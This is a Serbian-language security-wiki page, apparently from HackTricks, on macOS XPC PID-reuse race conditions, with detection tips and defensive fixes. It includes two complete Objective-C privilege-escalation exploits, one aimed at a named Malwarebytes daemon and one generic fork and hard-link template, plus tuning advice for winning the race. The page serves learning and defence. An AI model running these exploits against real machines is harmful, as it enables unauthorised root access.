# Ponovna upotreba macOS PID-a

{{#include ../../../../../../banners/hacktricks-training.md}}

## Ponovna upotreba PID-a

Kada macOS **XPC service** autentifikuje pozivaoca tako što razrešava njegov **PID**, umesto korišćenja kredencijala vezanih za primljenu poruku, može biti ranjiv na napad ponovne upotrebe PID-a. Praktični primitiv nije čekanje da se PID namespace preklopi: attacker šalje XPC zahtev i odmah poziva **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** sa opcijom `POSIX_SPAWN_SETEXEC`, zamenjujući image attacker-ovog procesa sa **dozvoljenim binary-jem, uz zadržavanje PID-a**.<sup>[[1]](#references)[[2]](#references)</sup>

Ako server skine zahtev iz reda i tek zatim razreši taj numerički PID u aktivan proces radi provere code-signing-a, entitlement-a, putanje ili parent-process provera, videće replacement binary umesto procesa koji je poslao poruku. `POSIX_SPAWN_START_SUSPENDED` održava trusted replacement aktivnim i stabilnim dok server obavlja proveru.<sup>[[1]](#references)[[2]](#references)</sup>

### Šta se zapravo utrkuje

Ranjivi sled je **TOCTOU identiteta poruke**, a ne samo činjenica da se „PID-ovi mogu ponoviti“:<sup>[[1]](#references)[[2]](#references)</sup>

1. Attacker proces uspostavlja ili nastavlja XPC connection i stavlja privileged zahtev u red.
2. Pre nego što service pretvori PID connection-a u `SecCodeRef` ili drugi objekat procesa, attacker preklapa isti proces odobrenim executable-om koristeći `POSIX_SPAWN_SETEXEC`.
3. Service validira odobreni image koji je trenutno vezan za taj PID, a zatim prosleđuje već ubačen attacker-controlled zahtev.

Svaki PID bridge u authorization data flow-u je sumnjiv: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` ili `audit_token_to_pid`, nakon čega slede `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` ili custom signature verifier. PID korišćen samo za logging nije dovoljan; potvrdite da stiže do allow/deny odluke. Takođe proverite error paths: pokušaj audit-token lookup-a, uz **fallback na PID u slučaju neuspeha**, ponovo uvodi istu race condition. Ovaj fallback pattern pojavio se u analizi privilegovanih XPC services kompanije Intego iz 2026. godine.<sup>[[3]](#references)</sup>

### Brza statička i dinamička triage analiza

Počnite od connection handler-a i pratite svaki poziv koji proizvodi PID do provera code-signing-a, entitlement-a, executable-path-a ili version provera. Ove komande pružaju brzi prvi pregled kandidata za helper; stripped binary-ji i dalje često otkrivaju imported symbols, Objective-C selectors ili diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Tokom kontrolisanog testa, prekinite ili zakačite i izvor PID-a i njegov verifikator. Pogodak na `xpc_connection_get_pid` ili `-processIdentifier` samo je trag; korisni dokazi su kasnije traženje **istog celog broja** nakon što je zahtev primljen. Frida može dodatno da zakači verifier specifičan za aplikaciju i privilegovani selector, kako bi se izmerilo da li se selector izvršava kada PID race bude uspešan.<sup>[[3]](#references)</sup>

### Exploit example

Ako pronađete funkciju **`shouldAcceptNewConnection`** ili funkciju koju ona poziva, a koja **poziva** **`processIdentifier`** i ne poziva **`auditToken`**, to vrlo verovatno znači da **proverava PID procesa**, a ne audit token.\
Na primer, kao na ovoj slici (preuzetoj iz reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Pogledajte ovaj primer exploit-a (takođe preuzet iz reference) da biste videli 2 dela exploit-a:<sup>[[1]](#references)</sup>

- Deo koji **generiše nekoliko fork-ova**
- **Svaki fork** će **poslati** **payload** XPC service-u dok izvršava **`posix_spawn`** odmah nakon slanja poruke.

> [!CAUTION]
> Kada koristite race sa `fork()` iz Objective-C procesa, pokrenite exploit sa eksportovanom promenljivom `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` ili ugradite oznaku `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Prva opcija koja koristi **`NSTasks`** i argument za pokretanje child procesa radi exploitovanja RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Ovaj primer koristi sirovi **`fork`** za pokretanje **dece koja će iskoristiti PID race condition**, a zatim iskorišćava **još jedan race condition putem Hard link-a:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Učiniti race reproducibilnim

Sledeće tačke za podešavanje ponavljaju se u funkcionalnim exploitima za ponovnu upotrebu PID-a i novijem testiranju privilegovanih pomoćnih procesa:<sup>[[1]](#references)[[3]](#references)</sup>

- Pošaljite zahtev i odmah pozovite `posix_spawn`; **nemojte** čekati odgovor. Zahtev već mora biti u redu čekanja dok serverova pretraga PID-a nastupa nakon zamene image-a.
- Zadržite `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` zajedno. Prva zastavica čuva PID procesa koji učestvuje u race-u; druga sprečava da validna meta izađe ili promeni stanje pre validacije.
- Koristite više kratkotrajnih racer-a i ponavljajte kompletnu sekvencu povezivanja/zahteva/exec-a. Optimalan broj zavisi od mete; previše child procesa može usporiti servis i pogoršati window.
- Zamena mora ispunjavati **ceo** zahtev servera. Kad god je moguće, ponovo koristite legitimni client binary i prvo proverite njegov designated requirement pomoću `codesign -d -r- "/path/to/client.app"`.
- Najpre pozovite bezopasan exported selector ili read-only metod. Tako razdvajate uspešnu autentikaciju od uspešnog iskorišćavanja kasnijeg privilegovanog primitive-a.

## Izbegavanje PID bridge-a

Na macOS 13 i novijim verzijama, Foundation izlaže `-[NSXPCConnection setCodeSigningRequirement:]`. Podesite peer requirement tačno jednom i **pre** `resume`; neispravni requirement string-ovi izazivaju exception (ili Swift fatal error), a poruka peer-a koji ne ispunjava requirement poništava konekciju. Ovo omogućava da XPC nametne code identity peer-a bez toga da application code razrešava PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Za moderni low-level listener API na macOS 26+, `xpc_listener_set_peer_requirement` primenjuje validirani `xpc_peer_requirement_t` dok je listener neaktivan. XPC odbacuje zahteve koji ga ne ispunjavaju; peer sesije kreirane iz listenera **ne nasleđuju** ovaj zahtev, zato primenite i odgovarajući session requirement kada te sesije autorizuju privilegovane operacije.<sup>[[7]](#references)</sup>

> [!WARNING]
> Nemojte ovo „popravljati” kopiranjem audit tokena, a zatim njegovim pretvaranjem nazad u PID za stvarni `SecCode` lookup. Identitet izveden iz audit tokena zadržite kroz odluku o autorizaciji ili koristite XPC peer-requirement API end-to-end.<sup>[[2]](#references)[[6]](#references)</sup> API-ji za audit token na nivou konekcije takođe imaju posebnu klasu race uslova, obrađenu u [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Drugi primeri

- [**Intego X9: Zašto vaš macOS antivirus ne bi trebalo da veruje PID-ovima**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE protiv privilegovanog helper-a antivirusnog programa koji je klijente autentifikovao pomoću PID-a.<sup>[[3]](#references)</sup>
- [**Iskorišćavanje GOG Galaxy XPC servisa za eskalaciju privilegija u macOS-u**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Deo II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Naučite XPC exploitation - Deo 2: Recite ne PID-u!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Ne verujte PID-u! Priče o jednostavnom logic bug-u i mestima na kojima ga možete pronaći - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Zašto vaš macOS antivirus ne bi trebalo da veruje PID-ovima](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Iskorišćavanje GOG Galaxy XPC servisa za eskalaciju privilegija u macOS-u](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Deo II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
